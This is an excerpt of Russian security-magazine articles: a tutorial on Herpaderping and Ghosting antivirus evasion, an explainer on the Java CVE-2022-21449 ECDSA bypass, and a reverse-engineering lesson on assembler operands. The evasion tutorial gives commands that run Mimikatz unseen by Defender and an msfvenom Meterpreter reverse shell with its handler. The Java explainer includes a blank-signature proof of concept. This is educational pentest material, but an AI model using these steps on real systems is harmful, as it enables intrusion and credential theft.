   Если ты администрируешь сеть, где включен NTLM, убедись, что службы,
разрешающие проверку подлинности NTLM, используют средства защиты.
Среди них — расширенная защита для проверки подлинности (EPA) или фун‐
кции подписи, такие как подпись SMB. А еще твоя сеть потенциально уяз‐
вима, если в домене включена проверка подлинности NTLM и используется
служба сертификации Active Directory (AD CS) с любой из следующих служб:
 • интернет‑регистрация центра сертификации;
 • веб‑служба регистрации сертификатов.

Официальных заявлений Microsoft по поводу описываемой атаки на момент
написания статьи не делалось.
ВЗЛОМ
HERPADERPING
     И
   GHOSTING

     ИЗУЧАЕМ ДВА НОВЫХ СПОСОБА
        СКРЫВАТЬ ПРОЦЕССЫ
          ОТ АНТИВИРУСОВ





                                                 be_a_saint
                                                  T.Hunter hacker's teamlead
                                               alexandr.khudozhilov@icloud.c
                                         om





Избежать обнаружения полезной нагрузки антивирусами —
важнейшая задача не только вирусописателей, но и пен‐
тестеров и участников red team. Для этого существуют раз‐
личные  техники. Сегодня мы подробно рассмотрим две
из них: Herpaderping и Ghosting. О двух других методиках —
Hollowing и Doppelgänging — можно почитать в статье «Мас‐
кируем   запуск    процессов   при   помощи   Process
Doppelgänging».


Для простоты в наших экспериментах мы будем использовать Microsoft
Defender и Mimikatz.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ОСОБЕННОСТИ ПРОЦЕССОВ
Как антивирус узнает, что в системе был запущен какой‑либо процесс?
Microsoft дает возможность разработчикам антивирусных решений получать
через        API        нужные      им       события        (например,
PsSetCreateProcessNotifyRoutineEx). Когда создается процесс, Microsoft
Defender (да и все остальные антивирусы) сразу узнает об этом, получив
соответствующий callback. Теперь‑то он может проинспектировать исполня‐
емый файл и сделать вывод, разрешить этот процесс или нет (опустим этап
статического анализа).
   Вся штука в том, что уведомление CreateProcessNotify— ни разу не про
создание процесса. Callback полетит тогда, когда внутри этого процесса воз‐
никнет первый поток (thread). Между моментами, когда процесс был создан
и когда антивирусное решение об этом узнало, образуется промежуток.
Это самое время злоумышленники творчески используют для своих целей.


Важно понимать
Исполняемый файл — это не процесс. Исполняемый файл может быть связан
со множеством процессов (в Task Manager можно легко проследить, сколько
процессов связано, например, с RuntimeBroker.exe или svchost.exe). Каж‐
дый процесс обязательно будет связан с каким‑либо PE-файлом (.exe, .dll
и  другие). При этом  процессы  предоставляют  ресурсы,  необходимые
для выполнения программы.
   Процесс содержит виртуальное адресное пространство, исполняемый
код, открытые дескрипторы для системных объектов, контекст безопасности,
уникальный идентификатор процесса, переменные среды, класс приоритета,
минимальный и максимальный размеры рабочего множества и по крайней
мере один поток выполнения.
   Поток — это базовая единица, в которой операционная система выделяет
процессорное время. Поток может выполнять любую часть кода процесса,
включая части, которые в данный момент выполняются другим потоком.


Создание процесса
Рассмотрим создание процесса по шагам.
 1. Сначала мы получаем дескриптор (handle) для исполняемого файла,
   который  запускаем,  например  так:  hFile  =  CreateFile(“C:\
  Windows\System32\svchost.exe”).
 2. Создаем image section (например, hSection  =  NtCreateSection(
  hFile, SEC_IMAGE)). Image section представляет собой особый раздел
   и служит для отображения файла (или части файла) в память. Раздел соот‐
    ветствует PE-файлам и может быть создан только в них.
 3. Создаем   процесс   в  image   section   (например,  hProcess   =
  NtCreateProcessEx(hSection)).
 4. Назначаем     аргументы    и    переменные    среды    (например,
  CreateEnvironmentBlock/NtWriteVirtualMemory).
 5. Создаем    поток    для    выполнения     процесса     (например,
  NtCreateThreadEx).

Важный  момент:   процессы   запускаются  из  исполняемых   файлов,
но информация внутри исполняемого файла может меняться относительного
того, что находится в image section (так как она кешируется memory manager).


Сканирование процесса в поисках зловреда
Как уже было сказано, антивирусы могут получать уведомления о событиях
создания   процессов   и   потоков     (PsSetCreateProcessNotifyRoutineEx
и PsSetCreateThreadNotifyRoutineEx).
   Выглядит это примерно так:


typedef struct _PS_CREATE_NOTIFY_INFO {
  SIZE_T Size;
  union {
    ULONG Flags;
    struct {
      ULONG FileOpenNameAvailable : 1;
      ULONG IsSubsystemProcess : 1;
      ULONG Reserved : 30;
    };
  };
  HANDLE ParentProcessId;
  CLIENT_ID CreatingThreadId;
  struct _FILE_OBJECT *FileObject;
  PCUNICODE_STRING ImageFileName;
  PCUNICODE_STRING CommandLine;
  NTSTATUS CreationStatus;
} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;

Из интересного: FILE_OBJECT соответствует дескриптору NtCreateSection.
Если же мы взглянем на API NtCreateProcess, то увидим там тоже дескрип‐
тор раздела, а не файла.


NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateProcess(
  _Out_ PHANDLE ProcessHandle,
  _In_ ACCESS_MASK DesiredAccess,
  _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
  _In_ HANDLE ParentProcess,
  _In_ BOOLEAN InheritObjectTable,
  _In_opt_ HANDLE SectionHandle,
  _In_opt_ HANDLE DebugPort,
  _In_opt_ HANDLE ExceptionPort
  );


ОТЛИЧИЯ ДВУХ ТЕХНИК
Для простоты я свел отличия описываемых в статье техник в таблицу.


 Техника       Действия

  Hollowing      map → modify section → execute

 Doppelgängin
                    transact → write → map → rollback → execute
 g

  Herpaderping     write → map → modify → execute → close

  Ghosting         delete pending → write → map → close(delete) → execute


HERPADERPING
Нам потребуется mimikatz.exe, целевой исполняемый файл (тут можно ука‐
зывать что угодно, у нас это будет hack.exe) и любой файл, не вызывающий
подозрений у антивирусных программ. Разберем методику Herpaderping
по шагам.
 1. Write. Создаем и открываем hack.exe, копируем в него mimikatz.exe,
   дескриптор не закрываем.
 2. Map. Создаем image section и мапим содержимое в память.
 3. Modify. Создаем процесс с дескриптором ранее созданного раздела.
   После  этого  меняем  содержимое  файла hack.exe,  копируя  туда
   что‑нибудь легитимное. Помнишь важный момент из раздела про соз‐
   дание процесса? Так вот это он и есть: с этого момента то, что у нас
   в памяти, и то, что хранится в файле, отличается.
 4. Execute. Создаем initial thread. Только сейчас антивирусу летит process
   creation callback. Различие содержимого в файле и в памяти сводит с ума
   Defender, он не может понять, можно ли разрешать выполнение этого про‐
   цесса.
 5. Close. Закрываем открытый дескриптор.


Herpaderping на практике
За всеми действиями будет наблюдать полностью обновленный Microsoft
Defender.  Естественно,  если  дропнуть  на  диск  Mimikatz  или  пейлоад
из MSFvenom в «чистом» виде, он тут же будет обнаружен антивирусом. Нам
нужно обойти статический анализ, но этот этап мы сейчас рассматривать
не будем.





                               Defender

Копируем проект из GitHub и собираем его.


git clone https://github.com/jxy-s/herpaderping.git
cd .\herpaderping\
git submodule update --init –recursive





                               Копируем проект

Выполняем команду


ProcessHerpaderping.exe mimikatz.exe hack.exe lsass.exe





                   Выполнение ProcessHerpaderping.exe

Как мы видим, все выполнилось успешно, Defender не среагировал. Давай
взглянем, что покажет нам ProcessHacker.





                             ProcessHacker

У нас исполняется не mimikatz.exe, а hack.exe. А еще у нашего приложения
hack.exe есть сертификат, выданный Microsoft.





                У нашего приложения есть сертификат

Ну а сам hack.exe спокойно лежит на рабочем столе.





                              Рабочий стол

Этот прием работает не только с Mimikatz: давай пробросим себе сессию
Meterpreter. Для этого сгенерируем полезную нагрузку и запустим листенер.


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.197
LPORT=9001 -f exe > met.exe





                             Payload generation


use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.197
set LPORT 9001
exploit

Выполним те же действия и глянем, прилетела ли сессия.





                            Выполнение met.exe





                              Полученная сессия

Ура, получилось!


GHOSTING
Для использования этого метода нам опять же потребуется наш исходный
файл  (mimikatz.exe) и целевой исполняемый файл. В качестве такового
можно указывать что угодно, у нас это будет уже привычный нам hack.exe.
Как и в прошлый раз, разберем технологию по шагам.
 1. Delete pending. Delete Pending — это состояние, при котором файл
  еще не удален, потому что дескриптор на него открыт. Как только дескрип‐
   тор закроется, файл удалится. Создаем файл и переводим в состояние
   delete-pending,       используя     NtSetInformationFile      (
  FileDispositionInformation).                     Использование
  FILE_DELETE_ON_CLOSE не удалит файл.
 2. Write. Копируем наш исходный исполняемый файл в созданный файл.
   Содержимое не сохраняется, так как файл находится в состоянии delete-
   pending. Также это состояние блокирует попытки открыть файл извне.
 3. Map. Создаем image section и мапим содержимое в память.
 4. Сlose(delete). Закрываем дескриптор, файл удаляется.
 5. Execute. Создаем процесс с дескриптором ранее созданного раздела.
   Создаем  initial thread. В этот момент антивирусу направляется process
   creation callback, но файл уже удален. Попытка открыть его завершится
   с ошибкой STATUS_FILE_DELETED. Если попробовать открыть файл
   до того, как он будет удален, получишь ту же самую ошибку.


Ghosting на практике
Копируем проект и собираем. Либо качаем уже собранный проект из GitHub.
   Выполняем команду


proc_ghost64.exe mimikatz.exe hack.exe





                       Выполнение proc_ghost64.exe

Как мы видим, снова все выполнилось успешно и Defender не среагировал.
Теперь давай оценим информацию, которую предоставит нам ProcessHacker.





                             ProcessHacker

Стоит обратить внимание на еще один инструмент, который реализует дан‐
ную технику, — KingHamlet. Он также реализует возможности криптования
исходного пейлоада:


KingHamlet.exe mimikatz.exe key





                               KingHamlet

А process ghosting используется на следующем шаге:


KingHamlet.exe mimikatz.exe.khe key hack.exe





                               KingHamlet

KingHamlet  также отработал успешно. В ProcessHacker мы увидим сле‐
дующее.





               ProcessHacker после применения KingHamlet


ВЫВОДЫ
Поведение Microsoft по отношению к описанным в этой статье методам не до
конца понятно. То компания заявляет, что выпустила закрывающий патч, то
Microsoft Security Response Center (MSRC) неожиданно сообщает: проблема
не соответствует критериям, требующим выпустить обновление безопас‐
ности или инструкции по предотвращению атак. Но как видим, пока эти
механизмы работают без каких‑либо трудностей, главное — обойти статичес‐
кий анализ.
ВЗЛОМ

 ЭЛЕКТРОННАЯ
 ПСИХОБУМАГА
      КРИТИЧЕСКАЯ УЯЗВИМОСТЬ
         В JAVA ПОЗВОЛЯЕТ
           ПОДДЕЛЫВАТЬ
       ЭЛЕКТРОННЫЕ ПОДПИСИ
            И КЛЮЧИ





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru





Всех, кто  использует  относительно новые версии Java-
фреймворка Oracle, в минувшую среду ждал неприятный
сюрприз. Исследователь из компании ForgeRock Нил Мэд‐
ден сообщил о критической уязвимости в Java, которая поз‐
воляет злоумышленникам легко подделывать сертификаты
и подписи TLS, сообщения двухфакторной аутентификации
и учетные данные авторизации. Эксперт опубликовал в сети
подробное описание уязвимости, с основными тезисами
которого мы сегодня хотим тебя познакомить.


Хронология событий
Нил Мэдден обнаружил эту ошибку в OpenJDK еще 11 ноября 2021 года
и сразу же сообщил о ней в Oracle. 18 ноября разработчик подтвердил
наличие проблемы и пообещал добавить исправление в следующее кри‐
тическое обновление безопасности, которое вышло 19 апреля 2022 года.
В этот же день ForgeRock опубликовал отчет с описанием уязвимости.


В популярном британском телесериале «Доктор Кто» есть повторяющийся
сюжет: главный герой с успехом выпутывается из различных неприятностей,
показывая окружающим совершенно пустой документ, изготовленный из спе‐
циальной «психобумаги». Эта бумага заставляет смотрящего на нее человека
видеть то, что хочет продемонстрировать ему владелец артефакта: пропуск,
удостоверение полицейского, судебный ордер или что‑то иное. Схожим
образом работает уязвимость, обнаруженная в нескольких недавних выпус‐
ках Java, вернее, в механизме широко используемого алгоритма с открытым
ключом для создания цифровых подписей ECDSA. Этой уязвимости, получив‐
шей обозначение CVE-2022-21449, подвержены версии Java 15, 16, 17 и 18,
вышедшие до критического обновления от апреля 2022 года. Кроме того,
в официальном сообщении Oracle также упоминаются более старые версии
Java, включая 7, 8 и 11. С другой стороны, в рекомендациях OpenJDK
перечислены только версии 15, 17 и 18, затронутые этой конкретной уяз‐
вимостью.





С использованием CVE-2022-21449 злоумышленники могут легко подделать
некоторые типы SSL-сертификатов и SSL-рукопожатий, что, в свою очередь,
позволяет перехватывать и изменять сообщения. Кроме того, становится
возможной подмена подписанных JSON Web Tokens (JWT), данных SAML,
токенов идентификации OIDC и даже сообщений аутентификации WebAuthn.
Фактически это и есть полный аналог киношной «психобумаги»,  только
в электронной форме.
   Серьезность этой проблемы трудно недооценить. Если ты используешь
подписи ECDSA для любого из перечисленных механизмов безопасности,
а на сервере установлена уязвимая версия Java, злоумышленник может
без  труда обойти эти механизмы. В  реальности  почти все  устройства
WebAuthn/FIDO (включая Yubikeys) используют подписи ECDSA, а многие пос‐
тавщики OIDC — токены JWT, подписанные тем же методом.
   Oracle присвоила этому CVSS оценку 7,5 балла, посчитав, что уязвимость
не оказывает серьезного влияния на конфиденциальность или доступность
данных, однако исследователи из ForgeRock оценили проблему в 10 баллов
из‑за широкого спектра воздействий на различные функции в контексте
управления доступом. Как же все‑таки работает уязвимость CVE-2022-21449?
Чтобы разобраться, необходимо немного углубиться в теорию.


ПОДПИСИ ECDSA
ECDSA расшифровывается как алгоритм цифровой подписи на эллиптичес‐
ких кривых (Elliptic Curve Digital Signature Algorithm) и широко используется
в качестве стандарта для подписи всех видов цифровых документов. По срав‐
нению со старым стандартом RSA ключи и подписи на основе эллиптической
криптографии имеют намного меньшие размеры в байтах, но при этом обес‐
печивают эквивалентную безопасность, в результате чего они применяются
в тех случаях, когда размер имеет большое значение. Например, стандарт
WebAuthn для двухфакторной аутентификации позволяет производителям
устройств выбирать из широкого спектра алгоритмов создания подписи,
но на практике почти все произведенные на сегодняшний день устройства
поддерживают только ECDSA (заметным исключением является разве что
Windows Hello, которая использует RSA, предположительно для совместимос‐
ти со старым оборудованием TPM).
  Не вдаваясь в технические детали, можно сказать, что подпись ECDSA
состоит из двух значений, называемых r и s. Чтобы проверить такую подпись,
верификатор решает уравнение, включающее значения r, s, открытый ключ
подписавшего и хеш сообщения. Если две части уравнения равны, подпись
считается действительной, в противном случае она отклоняется.
   Одна часть уравнения должна быть равна r, а другая часть умножается
на r и значение, полученное из s. Очевидно, было бы очень плохо, если бы r
и s оказались равны 0, потому что тогда мы проверяли бы равенство 0 = 0 ⨉
[куча вещей], которое будет истинным независимо от значения «кучи вещей».
Притом что эта самая «куча вещей» — важные данные, такие как сообщение
и открытый ключ. Вот почему самая первая проверка в алгоритме ECDSA
выполняется с целью удостовериться, что значения r и s >= 1.
   Догадайся, какую проверку забыли в Java? Бинго: валидатор подписи
ECDSA в Java не проверял, равны ли r или s нулю, поэтому ты при желании
можешь создать подпись с нулевыми значениями этих параметров. Тогда
Java примет такую подпись для любого сообщения или публичного ключа
как действительную.
   Вот интерактивный сеанс JShell, показывающий реализацию этой уяз‐
вимости, — здесь используется абсолютно пустая подпись, которая при‐
нимается в качестве действительной:


|  Welcome to JShell -- Version 17.0.1
|  For an introduction type: /help intro
jshell> import java.security.*
jshell> var keys = KeyPairGenerator.getInstance("EC").generateKeyPair
()
keys ==> java.security.KeyPair@626b2d4a
jshell> var blankSignature = new byte[64]
blankSignature ==> byte[64] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, ... , 0, 0, 0, 0, 0, 0, 0, 0 }
jshell> var sig = Signature.getInstance(
"SHA256WithECDSAInP1363Format")
sig ==> Signature object: SHA256WithECDSAInP1363Format<not
initialized>
jshell> sig.initVerify(keys.getPublic())
jshell> sig.update("Hello, World".getBytes())
jshell> sig.verify(blankSignature)
$8 ==> true
// Oops, that shouldn't have verified...

Квалификатор InP1363Format упрощает демонстрацию ошибки. Подписи
в формате ASN.1 DER могут использоваться таким же образом: просто сна‐
чала нужно немного повозиться с кодировкой. Но обрати внимание, что JWT
и другие стандарты применяют необработанный формат IEEE P1363.


НЕМНОГО ТЕХНИЧЕСКИХ ДЕТАЛЕЙ
Если не полениться и почитать в Википедии подробности о принципах работы
ECDSA, можно обнаружить, что правая часть уравнения умножается не на s,
                                                   -1а скорее на его обратный мультипликатор: s    . Если ты немного разбираешь‐
ся в математике, ты можешь задаться вопросом: разве вычисление этого
обратного результата не приведет к делению на ноль? Но в криптографии
на  основе  эллиптических  кривых  эта  обратная  величина  вычисляется
по модулю большого числа, n, а для кривых, обычно используемых в ECDSA, n
является простым числом, поэтому мы можем использовать малую теорему
Ферма для вычисления обратного модульного значения:


        n    1       x = x = x(mod n)
             (n – 1)     0«    x    = x  = 1(mod n)
             (n – 2)    –1          x    = x  (mod n)                »
Это очень эффективный метод, и именно его использует Java. Однако
это справедливо только в том случае, когда x не равен нулю, поскольку у нуля
                                                                           (n – 2)нет мультипликативной инверсии. Когда x равен нулю, 0      = 0: мусор
на входе, мусор на выходе.
   Тот факт, что вычисления выполняются по модулю n, также причина удос‐
товериться, что значения r и s < n . Поэтому, если r и s = n при n = 0 (mod
n), мы получим тот же эффект, как если бы r и s были равны нулю.
  Еще одна проверка, которая могла бы спасти Java, — это проверка того,
что точка, вычисленная из r и s, не является «бесконечно удаленной точкой».
Если r и s равны нулю, то результирующая точка фактически будет точкой
в бесконечности. Но, как ты уже, наверное, догадался, Java не выполняет
и эту проверку.


ПОЧЕМУ УЯЗВИМОСТЬ ОБНАРУЖИЛИ ТОЛЬКО СЕЙЧАС?
Широко известно, что Java уже давно поддерживает ECDSA. Всегда ли
реализация этого алгоритма была уязвимой и почему о проблеме стало
известно только сейчас?
   Исследователи из ForgeRock считают, что это относительно недавняя
ошибка, вызванная переписыванием кода EC с нативного C++ на Java, что
произошло в версии Java 15. Хотя, по мнению специалистов, эта переделка
дает преимущества с точки зрения безопасности памяти, похоже, в ее реали‐
зации не участвовали эксперты в области криптографии. Исходная версия
на C++ не содержит этих ошибок, но переписанная реализация уже имеет
уязвимость. Ни одна из отправившихся в релиз версий Java, по‑видимому,
не была полностью покрыта тестами, ведь даже самое беглое прочтение спе‐
цификации ECDSA предполагает как минимум проверку на предмет откло‐
нения недопустимых значений r и s. В общем, обнаружившие уязвимость
исследователи не уверены, что в этом коде не скрываются и другие критичес‐
кие ошибки.


ЧТО ТЕПЕРЬ ДЕЛАТЬ?
Если ты используешь Java 15 или более позднюю версию, незамедлительно
обнови ее или установи критический патч безопасности от Oracle.
   Криптографический код очень сложно реализовать правильно, а алгорит‐
мы подписи с открытым ключом —среди самых сложных. ECDSA сам по себе
весьма ненадежный алгоритм, где даже небольшая погрешность в одном
случайном значении может позволить полностью восстановить твой закрытый
ключ.
  С другой стороны, теперь существуют отличные ресурсы, такие как Project
Wycheproof, которые предоставляют тестовые примеры для известных уяз‐
вимостей. После того как эксперты ForgeRock обнаружили эту ошибку, они
обновили локальную копию Wycheproof для работы с Java 17 — и она сразу же
обнаружила проблему. Хочется верить, что команда JDK сама начнет исполь‐
зовать набор  тестов  Wycheproof,  чтобы  в будущем подобные  ошибки
не попадали в паблик.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex-
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

КАК ИСКАТЬ
ОПЕРАНДЫ
ПРИ ВЗЛОМЕ
                                                            Юрий ЯзевПРОГРАММ                                                                      Широко известен под
                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





Когда мы занимаемся  анализом ломаемой  программы,
пытаясь восстановить алгоритм ее работы, нам нужно опре‐
делить типы операндов ассемблерных инструкций. Для этого
есть несколько простых правил. Между тем среди операндов
присутствуют константы и смещения, которые внешне очень
похожи, но в то же время сильно различаются по способам
и целям взаимодействия. Поэтому важно отделить одно
от другого, так как такие «игры» — один из главных инстру‐
ментов разработчиков защит.


Фундаментальные основы хакерства
Пятнадцать лет назад эпический труд Криса Касперски «Фундаментальные
основы хакерства» был настольной книгой каждого начинающего исследова‐
теля в области компьютерной безопасности. Однако время идет, и знания,
опубликованные Крисом, теряют актуальность. Редакторы «Хакера» попыта‐
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
   Ссылки на другие статьи из этого цикла ищи на странице автора.



ИДЕНТИФИКАЦИЯ КОНСТАНТ И СМЕЩЕНИЙ
Микропроцессоры серии 80x86 поддерживают операнды трех типов: регистр,
непосредственное значение, непосредственный указатель. Тип операнда
явно задается в специальном поле машинной инструкции, именуемом mod,
поэтому никаких проблем в идентификации типов операндов не возникает.
Регистр — ну, все мы знаем, как выглядят регистры; указатель по общепри‐
нятому соглашению заключается в квадратные скобки, а непосредственное
значение записывается без них. Например:


MOV ECX, EAX;               ← регистровые операнды
MOV ECX, 0x666;             ← левый операнд регистровый, правый —
непосредственный
MOV [0x401020], EAX;        ← левый операнд — указатель, правый —
регистр

Кроме этого, микропроцессоры серии 80x86 поддерживают два вида адре‐
сации памяти: непосредственную и косвенную. Тип адресации определяется
типом указателя. Если операнд — непосредственный указатель, то и адре‐
сация непосредственна. Если же операнд‑указатель — регистр, то такая
адресация называется косвенной. Например:


MOV ECX,[0x401020]  ←непосредственная адресация
MOV ECX, [EAX]     ←косвенная адресация

Для инициализации регистрового указателя разработчики микропроцессора
ввели специальную команду, вычисляющую значение адресного выражения
addr и присваивающую его регистру REG, — LEA REG, [addr]. Например:


LEA EAX, [0x401020] ; Регистру EAX присваивается значение указателя
0x401020
MOV ECX, [EAX]      ; Косвенная адресация — загрузка в ECX двойного
слова,
                    ; расположенного по смещению 0x401020

Правый операнд команды LEA всегда представляет собой ближний (near) ука‐
затель (исключение составляют случаи использования LEA для сложения кон‐
стант — подробнее об этом см. в одноименном пункте). И все было бы
хорошо... да вот, оказывается, внутреннее представление ближнего указате‐
ля эквивалентно константе того же значения. Отсюда LEA EAX, [0x401020]
равносильно MOV EAX, 0x401020. В силу определенных причин MOV зна‐
чительно обогнал в популярности LEA, практически вытеснив последнюю инс‐
трукцию из употребления.
   Отказ от LEA породил фундаментальную проблему ассемблирования —
проблему OFFSET’a. В общих чертах ее суть заключается в синтаксической
неразличимости констант и смещений (ближних указателей). Конструкция MOV
EAX, 0x401020 может грузить в EAX и константу, равную 0x401020 (пример
соответствующего C-кода: a=0x401020), и указатель на ячейку памяти, рас‐
положенную по смещению 0x401020 (пример соответствующего C-кода:
a=&x). Согласись, a=0x401020 совсем не одно и то же, что a=&x! А теперь
представь, что произойдет, если в повторно ассемблированной программе
переменная х окажется расположена по иному смещению, а не 0x401020?
Правильно — программа рухнет, ибо указатель a по‑прежнему указывает
на ячейку памяти 0x401020, но здесь теперь «проживает» совсем другая
переменная!
   Почему переменная может изменить свое смещение? Основных причин
тому две. Во‑первых, язык ассемблера неоднозначен и допускает двоякую
интерпретацию. Например, конструкции ADD EAX, 0x66 соответствуют две
машинные инструкции: 83 C0 66 и 05 66 00 00 00 длиной три и пять байт
соответственно. Транслятор может выбрать любую из них, и не факт, что ту же
самую, которая была в исходной программе (до  дизассемблирования).
Неверно «угаданный» размер вызовет смещение всех остальных инструкций,
а вместе с ними и данных. Во‑вторых, смещение не замедлит вызвать
модификацию программы (разумеется, речь идет не о замене JZ на JNZ, а о
настоящей адаптации или модернизации), и все указатели тут же «посып‐
лются».
   Вернуть работоспособность программы помогает директива offset. Если
MOV EAX, 0x401020 действительно загружает в EAX указатель, а не констан‐
ту, по смещению 0x401020 следует создать  метку, именуемую, скажем,
loc_401020. Также нужно MOV EAX, 0x401020 заменить на MOV EAX, offset
loc_401020. Теперь указатель EAX связан не с фиксированным смещением,
а с меткой!
  А что произойдет, если предварить директивой offset константу, ошибоч‐
но приняв ее за указатель? Программа откажет или станет работать некор‐
ректно.  Допустим,  число 0x401020  выражало собой  объем  бассейна,
в который вода втекает через одну трубу, а вытекает через другую. Если
заменить константу указателем, то объем бассейна станет равен... сме‐
щению метки в заново ассемблированной программе и все расчеты полетят
к черту.
   Таким образом, очень важно определить типы всех непосредственных
операндов, и еще важнее определить их правильно. Одна ошибка может сто‐
ить программе жизни (в смысле работоспособности), а в типичной прог‐
рамме тысячи и десятки тысяч операндов!
   Отсюда возникает два вопроса:
 • Как вообще определяют типы операндов?
 • Можно ли их определять автоматически (или на худой конец хотя бы полу‐
   автоматически)?





                               Типы операндов


Определение типа непосредственного операнда
Непосредственный операнд команды LEA всегда указатель (исключение сос‐
тавляют ассемблерные «извращения»: чтобы сбить хакеров с толку, в некото‐
рых защитах LEA используются для загрузки константы).
   Непосредственные операнды команд MOV и PUSH могут быть как констан‐
тами, так и указателями. Чтобы определить тип непосредственного операнда,
необходимо проанализировать, как используется его значение в программе.
Для косвенной адресации памяти — это указатель, в противном случае —
константа.
   Например, мы  встретили  в  тексте  программы  команду  MOV  EAX,
0x401020. Что это такое: константа или указатель?





                               Типы адресаций

Ответ на вопрос дает строка MOV ECX, [EAX], подсказывающая, что зна‐
чение 0x401020 используется для косвенной адресации памяти. Следова‐
тельно, непосредственный операнд не что иное, как указатель.
   Существует два типа указателей — указатели на данные и указатели
на функцию. Указатели на данные используются для извлечения значения
ячейки памяти и  встречаются в  арифметических  командах и  командах
пересылки (например, MOV, ADD, SUB). Указатели на функцию используются
в командах косвенного вызова и реже в командах косвенного перехода —
CALL и JMP соответственно.
   Следующий  пример  (const_pointers_cb)  откомпилируй  с помощью
C++Builder. В нем мы изучим разницу между константами и указателями:


int _tmain(int argc, _TCHAR* argv[])
{
    static int a = 0x777;
    int* b = &a;
    int c = b[0];
}

Результат компиляции должен выглядеть приблизительно так:


main            proc near
var_1C          = dword ptr -1Ch
var_18          = qword ptr -18h
var_10          = qword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
; Открытие кадра стека
                push    rbp
; Выделение 0x20 байт для локальных переменных
                sub     rsp, 20h
; Кадр стека указывает на дно стека
                lea     rbp, [rsp+20h]

Название смещения unk_451110 говорит о том, что значение по адресу
451110 имеет неопределенный тип.
   Перейдем по нему и посмотрим, что там находится.



Так как число 0x777 не умещается в одном байте, компилятор разместил его
в двух байтах. Следовательно, в RAX помещается ссылка на это число.


lea     rax, unk_451110

Хотя IDA представила данные программы так, как их приготовил компилятор,
мы уже самостоятельно определили, что по смещению unk_451110 находится
число, занимающее больше одного байта. Поэтому мы можем помочь IDA
правильно отобразить данные. Для  этого, перейдя по смещению, надо
нажать клавишу с английской o, что соответствует команде: Edit → Operand
Type → Offset → Offset (data segment). В результате смещение будет переиме‐
новано, а значение, на которое оно указывает, примет благородный вид:
777h. Кроме того, команда преобразования неопределенных байтов в дан‐
ные с db (один байт) изменится на dq (восемь байт).



Инициализация локальных переменных:


mov     [rbp+var_4], 0
mov     [rbp+var_8], ecx
mov     [rbp+var_10], rdx

В RAX расположена ссылка на значение, она копируется в переменную
var_18. Поскольку значение по ссылке unk_451110 находится в сегменте
данных, можно сделать вывод, что var_18 — статическая переменная.


mov     [rbp+var_18], rax

Копируем ссылку на переменную в памяти и таким образом получаем воз‐
можность изменить ссылку, но не значение.


mov     rax, [rbp+var_18]

Загружаем содержимое локальной переменной var_18 в регистр ECX. Отсю‐
да можно сделать вывод, что в RAX все‑таки указатель. Тогда локальная
переменная var_18 тоже указатель!


mov     ecx, [rax]

Присваиваем локальной переменной var_1C значение, содержащееся в ECX.
А там хранится указатель на 0x777.


                mov     [rbp+var_1C], ecx
                mov     [rbp+var_4], 0


; Функция возвращает ноль
                mov     eax, [rbp+var_4]
; Очищаем стек
                add     rsp, 20h
; Закрываем кадр стека
                pop     rbp
                retn
main            endp

Черт  ногу  сломит  с  этими  указателями!  Теперь  рассмотрим  пример
func_pointers_cb с косвенным вызовом функции (также скомпилированный
с помощью C++Builder):


int func(int a, int b)
{
    return a + b;
}


int _tmain(int argc, _TCHAR* argv[])
{
    int (*zzz) (int a, int b) = func;
    // Вызов функции происходит косвенно — по указателю zzz
    zzz(0x666, 0x777);
    return 0;
}

Результат компиляции должен выглядеть приблизительно так:


main            proc near
var_1C          = dword ptr -1Ch
var_18          = qword ptr -18h
var_10          = qword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
; Открываем кадр стека
                push    rbp
; Выделяем 0x40 под локальные переменные
                sub     rsp, 40h
; Указатель кадра стека
                lea     rbp, [rsp+40h]
; В EAX заносим значение 0x666, пока непонятно для чего, но явно не
для передачи
                mov     eax, 666h
; В R8D заносим значение 0x777
                mov     r8d, 777h
; Смотри! В R9 заносим указатель на функцию
                lea     r9, func(int,int)
; Инициализируем локальные переменные
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
; В var_18 помещаем указатель на функцию func
                mov     [rbp+var_18], r9
; Теперь ECX равна 0x666
                mov     ecx, eax
; а EDX — 0x777, регистры загружены и готовы для передачи параметров
                mov     edx, r8d
; Погляди-ка! Косвенный вызов функции!
                call    [rbp+var_18]
                mov     [rbp+var_4], 0
                mov     [rbp+var_1C], eax
                mov     eax, [rbp+var_4]
; Очищаем стек
                add     rsp, 40h
; Восстанавливаем регистр
                pop     rbp
                retn
main            endp

А вот и косвенно вызываемая функция func. Исследуем ее, чтобы определить
тип передаваемых ей непосредственных значений.


func(int, int)  proc near
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

IDA не определила аргументы, но мы‑то знаем, что они есть! Сейчас, когда
параметры всегда передаются через регистры, различие между аргументами
и локальными переменными — чистая формальность.


; Открываем кадр стека
                push    rbp
; Выделяем память для содержимого стека
                sub     rsp, 10h
; Кадр стека указывает на дно стека
                lea     rbp, [rsp+10h]

